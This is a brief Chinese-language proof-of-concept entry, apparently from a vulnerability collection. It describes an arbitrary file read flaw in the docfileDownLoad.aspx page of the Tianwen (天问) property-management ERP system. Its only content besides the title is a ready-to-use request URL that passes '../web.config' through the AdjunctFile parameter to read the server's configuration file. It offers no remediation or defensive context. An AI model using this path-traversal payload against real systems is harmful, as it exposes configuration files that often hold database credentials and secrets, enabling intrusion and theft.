## 天问物业ERP系统docfileDownLoad.aspx存在任意文件读取漏洞


## poc
```
http://ip/HM/M_Main/WorkGeneral/docfileDownLoad.aspx?AdjunctFile=../web.config
```
